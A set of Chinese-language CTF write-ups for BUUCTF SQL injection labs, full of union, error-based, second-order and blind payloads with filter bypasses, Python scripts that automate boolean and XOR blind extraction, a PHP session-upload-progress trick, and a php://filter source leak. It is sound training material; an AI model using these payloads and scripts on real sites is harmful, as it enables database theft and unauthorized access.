# SQL注入

## [极客大挑战 2019]LoveSQL

![image-20240308214318915](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214318915.png)

![image-20240308214347915](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214347915.png)

```mysql
说明存在sql注入，直接套用万能公式
```

![image-20240308214423022](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214423022.png)

![image-20240308214444009](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214444009.png)

```mysql
怀疑有编码，但是实际没有，接下来使用group by来看有几列
```

![image-20240308214519166](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214519166.png)

![image-20240308214540593](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214540593.png)

![image-20240308214628677](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214628677.png)

![image-20240308214643934](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214643934.png)

![image-20240308214650205](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214650205.png)

```
说明有三列，接下来查找回显位
```

![image-20240308214718213](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214718213.png)

![image-20240308214733689](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308214733689.png)

```mysql
1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 #
直接爆表
```

![image-20240308215006680](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308215006680.png)

```mysql
1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'),3 #
发现geekuser这个表里有三列
1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'),3 #
换成l0ve1ysq1表，同样是id,username和password
```

![image-20240308215206047](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308215206047.png)

```mysql
1' union select 1,(select group_concat(password) from geekuser),3 #
无用
```

![image-20240308215611614](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308215611614.png)

```mysql
1' union select 1,(select group_concat(password) from l0ve1ysq1),3 #
找到flag{6c514f1c-a064-4c2b-91ed-d415b603d801}
```

![image-20240308215726060](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308215726060.png)

## [极客大挑战 2019]EasySQL

```mysql
先上万能密码，然后直接拿到flag
```

![image-20240308220057360](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308220057360.png)

![image-20240308220120559](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308220120559.png)

## [极客大挑战 2019]BabySQL

```mysql
上万能密码，发现不行，报错中没看到or，再加上题目原页面中说了进行了过滤，猜测or被过滤，尝试用双写绕过
```

![image-20240308220618449](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308220618449.png)

![image-20240308220633520](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308220633520.png)

```mysql
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' oorr 1=1 #
```

![image-20240308221828812](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308221828812.png)

```mysql
这说明注释符貌似没起作用，应该也是被过滤了，那换成url编码%23，成功绕过
```

![image-20240308221924006](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308221924006.png)

```mysql
用group by查询列数，发现报错，应该是被过滤了，换成order by试试
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' oorrder by 3 %23
```

![image-20240308222138545](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308222138545.png)

```mysql
依旧不行，猜测by也被过滤，进行双写成功绕过，得到有三列，接下来使用union select 1,2,3进行尝试，不出意料报错了，应该是union select被过滤，并且大小写绕过不了
```

![image-20240308222441005](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308222441005.png)

```mysql
直接进行报错注入尝试
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' and extractvalue(1,concat('~',database())) %23
报错
```

![image-20240308222705234](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308222705234.png)

```mysql
应该是and也被过滤了，双写成功绕过
```

![image-20240308222730241](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308222730241.png)

```mysql
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()))) %23
通过双写绕过select,from,where的过滤，拿到表名b4bsql和geekuser
```

![image-20240308223319254](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308223319254.png)

```mysql
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() anandd table_name='b4bsql'))) %23
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() anandd table_name='geekuser'))) %23
两个表的列名都是一样的
```

![image-20240308223449297](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308223449297.png)

```mysql
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect group_concat(id,'~',username,'~',passwoorrd) frfromom b4bsql))) %23
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect group_concat(id,'~',username,'~',passwoorrd) frfromom geekuser))) %23
没有找到flag
```

![image-20240308223910709](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308223910709.png)

![image-20240308223930772](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240308223930772.png)

```mysql
换成
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' ununionion seselectlect 1,2,group_concat(username,passwoorrd) frfromom b4bsql %23
成功找到flag{dd215019-7295-4f45-8377-cbcf382fcbf0}
报错注入因为字符限制在32个，所以无法将后面的flag显示出来，将指令换成
http://db8a0bca-4939-483e-a791-bc33be1dd7ef.node5.buuoj.cn:81/check.php?username=1&password=1' aandnd extractvalue(1,concat('~',(sselectelect subsubstrstr(group_concat(username,'~',passwoorrd),190,30) frfromom b4bsql))) %23
即可看到flag，注意substr也被过滤了
```

## [极客大挑战 2019]FinalSQL

首先进入靶机，看见这么一个页面，那么把1、2、3、4、5按钮都点一下试试

![image-20240321185808390](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321185808390.png)

其中第五个给出了提示，它让我看看第六个，同时发现url上有?id=5，那么改成?id=6试试

![image-20240321185954087](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321185954087.png)

![image-20240321190010649](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321190010649.png)

既然它把6藏在这，那么说明可能有用处，先回到主页面再看看，试试admin弱口令，发现好像如果是admin，就会显示这个界面

![image-20240321190215077](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321190215077.png)

输入两个123时，猜测admin被过滤

![image-20240321190331327](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321190331327.png)

回到?id=6页面，寻找注入点，输入一个单引号，页面显示error，那么应该是有sql注入漏洞

![image-20240321190824435](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321190824435.png)

输入‘ or 1=1#，显示被过滤，再经过多轮测试之后，发现过滤了很多字符，包括空格和大部分常用关键字，报错也行不通，那么就尝试异或注入

![image-20240321191002707](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321191002707.png)

当输入

```mysql
?id=6^(length(database())<4)^1#
的时候，页面显示
```

![image-20240321191425185](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321191425185.png)

改成

```mysql
?id=6^(length(database())<5)^1#
的时候，页面显示
```

![image-20240321191559333](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321191559333.png)

存在true和false的判断，那么确定异或注入这条路行得通，首先确定6\^0\^1的结果是7，6\^1^1的结果是6，由于id=7不存在，所以会显示ERROR，以下是payload脚本

```py
#! /usr/bin/python3
import requests
import sys
import time
def get_dbname(url,db_len):
    dbname = ""
    db_len += 1
    for i in range(1,db_len):
        MAX = 128
        MIN = 32
        MID = (MAX + MIN) // 2
        while MIN <= MAX:
            p_url = url + "6^(ascii(substr(database(),%d,1))>=%d)^1#"%(i,MID)
            r = requests.get(p_url)
            if "Clever" in r.text:
                MIN = MID + 1
                MID = (MIN + MAX) // 2
                pass
            else:
                MAX = MID - 1
                MID = (MIN + MAX) // 2
                pass
            pass
        dbname += chr(MID)
    print("数据库名：",dbname)
    return dbname
def get_table(url):
    name = ""
    i = 0
    print("字段内容为：")
    while True:
        i += 1
        MAX = 128
        MIN = 32
        MID = (MAX + MIN) // 2
        while MIN <= MAX:
            p_url = url + "6^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),%d,1))>=%d)^1#"%(i,MID)
            # p_url = url + "6^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>=%d)^1#"%(i,MID)
            # p_url = url + "6^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),%d,1))>=%d)^1#"%(i,MID)
            # p_url = url + "6^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>=%d)^1#"%(i,MID)
            # p_url = url + "6^(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),%d,1))>=%d)^1#"%(i,MID)
            r = requests.get(p_url)
            if "Clever" in r.text:
                MIN = MID + 1
                MID = (MAX + MIN) // 2
                pass
            else:
                MAX = MID - 1
                MID = (MAX + MIN) // 2
                pass
            pass
        name += chr(MID)
        if MID == 31:
            break
        print(name)
        time.sleep(0.5)
if __name__=="__main__":
    url = "http://e1a505a3-fc79-4f85-8af9-d8528196a7bb.node5.buuoj.cn:81/search.php?id="
    db_len = 4
    dbname = get_dbname(url,db_len)
    get_table(url)

```

![image-20240321210035185](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321210035185.png)

![image-20240321210135607](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321210135607.png)

![image-20240321210738997](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321210738997.png)

![image-20240321234502069](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240321234502069.png)

flag{46bfc2aa-b152-4a3b-aadc-065406897fcf}



## [RCTF2015]EasySQL

首先进入页面，有登录和注册两个页面，那么在这两个页面找一下是否有注入点，在尝试多遍后并没有发现注入点，那么就先注册一个账号登录进去看看主页面有什么，发现了修改密码的界面，那么猜测可以进行二次注入(下面的图片中的0x7e忽略)

![image-20240318202010395](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318202010395.png)

重新回到注册页面，注册一个名为2’“的用户，并登录进行修改密码操作，成功发现了注入点，并判断其为双引号闭合

![image-20240318202156512](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318202156512.png)

那么再次回到注册页面，尝试注册一个名为3” order by 3#的用户，提示invalid string

![image-20240318202346738](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318202346738.png)



那么应该是该名称中有字符串是非法的，经过测试后发现是空格被过滤了，那么直接换个策略，使用报错注入，创建一个名为4”||extractvalue(1,concat(‘0x7e’,(database())))#的用户，成功拿到库名，那么证明这条路是可行的

![image-20240318202552084](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318202552084.png)

再次回到注册页面，构造payload：

```mysql
5"||extractvalue(1,concat('0x7e',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))#
```

得到表名

![image-20240318203030122](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318203030122.png)

接着构造payload：

```mysql
6"||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag'))))#
```

发现出现invalid string，那么就应该是and被过滤了，那么不用and构造payload：

```mysql
6"||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag'))))#
```

得到列名

![image-20240318203630759](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318203630759.png)

```mysql
7"||extractvalue(1,concat('~',(select(group_concat(flag))from(flag))))#
```

![image-20240318204246206](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318204246206.png)

flag并不在这个表里，那么转头去看users表

```mysql
8"||extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))))#
```

![image-20240318212324280](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318212324280.png)

应该是由于报错注入的字符限制， 应该是real_flag_1s_here

```mysql
9"||extractvalue(1,concat('~',(select(group_concat(real_flag_1s_here))from(users))))#
```

![image-20240318212506667](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318212506667.png)

依旧不是flag，那么就应该在name、pwd和email里面了

```mysql
10"||extractvalue(1,concat('~',(select(group_concat(email))from(users))))#
```

email里没有

![image-20240318212825592](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318212825592.png)

```mysql
11"||extractvalue(1,concat('~',(select(group_concat(name))from(users))))#
```

name里没有

![image-20240318212944675](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240318212944675.png)

```mysql
12"||extractvalue(1,concat('~',(select(group_concat(pwd))from(users))))#
```

同样也没有flag，去看了下flag发现就是那个real_flag_1s_here文件，只不过是因为该字段有多列而已，flag就在那里，成功看到flag

```mysql
13"||extractvalue(1,concat('~',(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))))#
flag{b60f3ff9-bb48-4e19-bfa9-43
```

![image-20240319190400069](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240319190400069.png)

```mysql
14"||extractvalue(1,concat('~',(select(substring(group_concat(real_flag_1s_here),25,30)from(users)where(real_flag_1s_here)regexp('^f'))))#
```

发现提示invalid string，检测发现是substring被过滤掉了，那么换种方法进行绕过，试着用逆向输出的方法

```mysql
15"||extractvalue(1,concat('~',reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))))#
```

![image-20240319190123223](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240319190123223.png)

成功拿到flag的后半部分，拼接一下得到

flag{b60f3ff9-bb48-4e19-bfa9-434d1eb444da}

## [PwnThyBytes 2019]Baby_SQL

打开环境是登录和注册界面，尝试注册一个账号但是发现行不通，弱口令也无用，那么查看页面源代码，在最后几行看见了source.zip

![image-20240322145051800](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240322145051800.png)

在url上输入source.zip便下载了下来，里面包括一些源码，index.php、login.php、db.php、register.php、home.php

首先查看index.php，利用filter函数对所有参数都进行了过滤，这个界面没有什么突破点

![image-20240322145225609](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240322145225609.png)

查看login.php，首先检查SESSION是否开启，未开启则无法直接进入这个页面，而$sql中显示username有明显的sql注入漏洞，并且什么都没有过滤

![image-20240322145903261](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240322145903261.png)

查看register.php，同样检查SESSION是否开启，然后用户名必须要包含admin，且长度必须在6到10之间，相比较之下，login.php明显更容易进行注入

![image-20240322150050218](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240322150050218.png)

写到这里对如何绕过SESSION的方法没有了解过，去看了看WP，知道了如何去绕过SESSION_START的方法，即

```
在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()
```

那么就可以在编写脚本时来绕过SESSION_START来进入到login.php页面

```py
#! /usr/bin/python3
import requests

url = "http://b82eb306-0bf2-42a8-bb4a-660ee3de9204.node5.buuoj.cn:81/templates/login.php"

files = {"file": "123456789"}
a = requests.post(url=url, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"}, params={'username': 'test', 'password': 'test'})
print(a.text)
```

![image-20240323102545640](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323102545640.png)

可见成功进入了login.php页面，那么接下来编写脚本

```py
#! /usr/bin/python3
import time
import requests

def get_len(url,files):
    for i in range(1,10):
        payload_database = {'username': 'test" or (length(database())=%d) #' % i,'password': 'test'}
        r = requests.post(url=url, params=payload_database, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"}, cookies={"PHPSESSID": "test1"})
        if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
            print("数据库长度为：",i)
            return i
        
def get_dbname(url, files,db_len):
    db_name = ''
    db_len += 1
    for i in range(1, db_len):
        Min = 32
        Max = 128
        Mid = (Min + Max) // 2
        while Min <= Max:
            time.sleep(0.06)
            payload_database = {'username': 'test" or (ascii(substr((select database()),{0},1))>={1}) #'.format(i, Mid),'password': 'test'}
            r = requests.post(url=url, params=payload_database, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"}, cookies={"PHPSESSID": "test1"})
            if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
                Min = Mid + 1
                Mid = (Min + Max) // 2
                pass
            else:
                Max = Mid - 1
                Mid = (Min + Max) // 2
                pass
            pass
        db_name += chr(Mid)
        print(db_name)    
    print("数据库名为：",db_name)
    return db_name

def get_table(url,files):
    tb_name = ""
    i = 0
    while True:
        i += 1
        Max = 128
        Min = 32
        Mid = (Max + Min) // 2
        while Min <= Max:
            time.sleep(0.06)
            payload_database = {'username': 'test" or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>={1}) #'.format(i, Mid),'password': 'test'}
            r = requests.post(url=url, params=payload_database, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"}, cookies={"PHPSESSID": "test1"})
            if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
                Min = Mid + 1
                Mid = (Min + Max) // 2
                pass
            else:
                Max = Mid - 1
                Mid = (Min + Max) // 2
                pass
            pass
        tb_name += chr(Mid)
        if (Mid == 31):
            break
        print(tb_name)
    print("表名为：",tb_name)
    return tb_name

def get_lie(url,files):
    lie_name = ""
    i = 0
    while True:
        i += 1
        Max = 128
        Min = 32
        Mid = (Max + Min) // 2
        while Min <= Max:
            time.sleep(0.06)
            payload_database = {'username': 'test" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="flag_tbl"),{0},1))>={1}) #'.format(i, Mid),'password': 'test'} # ptbctf
            r = requests.post(url=url, params=payload_database, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"}, cookies={"PHPSESSID": "test1"})
            if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
                Min = Mid + 1
                Mid = (Min + Max) // 2
                pass
            else:
                Max = Mid - 1
                Mid = (Min + Max) // 2
                pass
            pass
        lie_name += chr(Mid)
        if (Mid == 31):
            break
        print(lie_name)
    print("列名为：",lie_name)
    return lie_name

def get_content(url,files):
    content = ""
    i = 0
    while True:
        i += 1
        Max = 128
        Min = 32
        Mid = (Max + Min) // 2
        while Min <= Max:
            time.sleep(0.06)
            payload_database = {'username': 'test" or (ascii(substr((select group_concat(secret) from flag_tbl),{0},1))>={1}) #'.format(i, Mid),'password': 'test'}
            r = requests.post(url=url, params=payload_database, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"}, cookies={"PHPSESSID": "test1"})
            if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
                Min = Mid + 1
                Mid = (Min + Max) // 2
                pass
            else:
                Max = Mid - 1
                Mid = (Min + Max) // 2
                pass
            pass
        content += chr(Mid)
        if (Mid == 31):
            break
        print(content)
    print("内容为：",content)
    return content
    
if __name__ == "__main__":
    url = "http://7f70e840-95cf-411b-b14b-43f7d5ff678a.node5.buuoj.cn:81/templates/login.php"
    files = {"file": "123456789"}
    db_len = get_len(url,files)
    db_name = get_dbname(url,files,db_len)
    tb_name = get_table(url,files)
    lie_name = get_lie(url,files)
    content = get_content(url,files)
    print("数据库名：{}\n表名：{}\n列名：{}\n内容：{}\n".format(db_name,tb_name,lie_name,content))
```

![image-20240323141806426](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323141806426.png)

## [CISCN2019 华北赛区 Day2 Web1]Hack World

打开环境，告诉我们flag在表flag里，在列flag里，首先试着输入单引号

![image-20240323170948111](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323170948111.png)

![image-20240323171039115](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323171039115.png)

再试试永真，提示检测到sql注入，那么应该是有东西被过滤了，经过检查发现or、空格和注释符都被过滤，再找找其它被过滤的有哪些，发现还有union、and、||、&&等等

![image-20240323171110316](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323171110316.png)

但是当输入0，1时都有回显，然后我试着输入false和true，刚好对应0和1的回显，那这就好办了，是布尔盲注，再根据提示，直接跳过查询数据库等前面的步骤，直接确定表flag和列flag

```py
#! /usr/bin/python3
import requests
import time
flag = ""
url = "http://7b6b1486-7736-47e9-a2bf-6a95c0039ab9.node5.buuoj.cn:81/index.php"
i = 0
while True:
    i += 1
    low = 32
    high = 128
    mid = (low + high) // 2
    while low <= high:
        time.sleep(0.06)
        payload = "if((ascii(substr((select(flag)from(flag)),{0},1))>={1}),1,0)".format(i,mid)
        data = {"id":payload}
        r = requests.post(url = url, data = data)
        if 'Hello, glzjin wants a girlfriend' in r.text:
            low = mid + 1
            mid = (low + high) // 2
            pass
        else:
            high = mid - 1
            mid = (low + high) // 2
            pass
        pass
    flag += chr(mid)
    if (mid == 31):
        break
    print(flag)
```

![image-20240323175124819](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323175124819.png)



## [GXYCTF2019]BabysqliV3.0

打开环境，随便输用户名和密码先，提示not this user

![image-20240323152525800](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323152525800.png)

![image-20240323152606276](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323152606276.png)

换成admin试试，提示wrong pass，那么确定用户名是admin

![image-20240323152658114](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323152658114.png)

那么就可以尝试用bp来进行密码爆破，直接就把密码爆破出来了，弱密码

![image-20240323164056437](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240323164056437.png)

登录进来看见这个页面，第一个想到的就是文件上传，看到url，也可以尝试用伪协议试试，url中没有加php，但是如果自己加php的话，就会被转变为fxxkyou，要看upload，试着用伪协议

![image-20240324192430740](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240324192430740.png)

![image-20240324192634360](BUUCTF%E9%A2%98%E8%A7%A3.assets/image-20240324192634360.png)

```php
http://89835867-fd5d-4c77-a8a8-0b1145f6b51a.node5.buuoj.cn:81/home.php?file=php://filter/convert.base64-encode/resource=upload
```

```
PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+IA0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCgnkuIrkvKDmlofku7YNCgk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSLkuIrkvKAiIC8+DQo8L2Zvcm0+DQoNCjw/cGhwDQplcnJvcl9yZXBvcnRpbmcoMCk7DQpjbGFzcyBVcGxvYWRlcnsNCglwdWJsaWMgJEZpbGVuYW1lOw0KCXB1YmxpYyAkY21kOw0KCXB1YmxpYyAkdG9rZW47DQoJDQoNCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgpew0KCQkkc2FuZGJveCA9IGdldGN3ZCgpLiIvdXBsb2Fkcy8iLm1kNSgkX1NFU1NJT05bJ3VzZXInXSkuIi8iOw0KCQkkZXh0ID0gIi50eHQiOw0KCQlAbWtkaXIoJHNhbmRib3gsIDA3NzcsIHRydWUpOw0KCQlpZihpc3NldCgkX0dFVFsnbmFtZSddKSBhbmQgIXByZWdfbWF0Y2goIi9kYXRhOlwvXC8gfCBmaWx0ZXI6XC9cLyB8IHBocDpcL1wvIHwgXC4vaSIsICRfR0VUWyduYW1lJ10pKXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRfR0VUWyduYW1lJ107DQoJCX0NCgkJZWxzZXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRzYW5kYm94LiRfU0VTU0lPTlsndXNlciddLiRleHQ7DQoJCX0NCg0KCQkkdGhpcy0+Y21kID0gImVjaG8gJzxicj48YnI+TWFzdGVyLCBJIHdhbnQgdG8gc3R1ZHkgcml6aGFuITxicj48YnI+JzsiOw0KCQkkdGhpcy0+dG9rZW4gPSAkX1NFU1NJT05bJ3VzZXInXTsNCgl9DQoNCglmdW5jdGlvbiB1cGxvYWQoJGZpbGUpew0KCQlnbG9iYWwgJHNhbmRib3g7DQoJCWdsb2JhbCAkZXh0Ow0KDQoJCWlmKHByZWdfbWF0Y2goIlteYS16MC05XSIsICR0aGlzLT5GaWxlbmFtZSkpew0KCQkJJHRoaXMtPmNtZCA9ICJkaWUoJ2lsbGVnYWwgZmlsZW5hbWUhJyk7IjsNCgkJfQ0KCQllbHNlew0KCQkJaWYoJGZpbGVbJ3NpemUnXSA+IDEwMjQpew0KCQkJCSR0aGlzLT5jbWQgPSAiZGllKCd5b3UgYXJlIHRvbyBiaWcgKOKAsuKWvWDjgIMpJyk7IjsNCgkJCX0NCgkJCWVsc2V7DQoJCQkJJHRoaXMtPmNtZCA9ICJtb3ZlX3VwbG9hZGVkX2ZpbGUoJyIuJGZpbGVbJ3RtcF9uYW1lJ10uIicsICciIC4gJHRoaXMtPkZpbGVuYW1lIC4gIicpOyI7DQoJCQl9DQoJCX0NCgl9DQoNCglmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQoJCWdsb2JhbCAkc2FuZGJveDsNCgkJZ2xvYmFsICRleHQ7DQoJCS8vIHJldHVybiAkc2FuZGJveC4kdGhpcy0+RmlsZW5hbWUuJGV4dDsNCgkJcmV0dXJuICR0aGlzLT5GaWxlbmFtZTsNCgl9DQoNCglmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQoJCWlmKCR0aGlzLT50b2tlbiAhPSAkX1NFU1NJT05bJ3VzZXInXSl7DQoJCQkkdGhpcy0+Y21kID0gImRpZSgnY2hlY2sgdG9rZW4gZmFsaWVkIScpOyI7DQoJCX0NCgkJZXZhbCgkdGhpcy0+Y21kKTsNCgl9DQp9DQoNCmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpIHsNCgkkdXBsb2FkZXIgPSBuZXcgVXBsb2FkZXIoKTsNCgkkdXBsb2FkZXItPnVwbG9hZCgkX0ZJTEVTWyJmaWxlIl0pOw0KCWlmKEBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpKXsNCgkJZWNobyAi5LiL6Z2i5piv5L2g5LiK5Lyg55qE5paH5Lu277yaPGJyPiIuJHVwbG9hZGVyLiI8YnI+IjsNCgkJZWNobyBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpOw0KCX0NCn0NCg0KPz4NCg==
```

```php
upload.php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传文件
	<input type="file" name="file" />
	<input type="submit" name="submit" value="上传" />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>
```

```
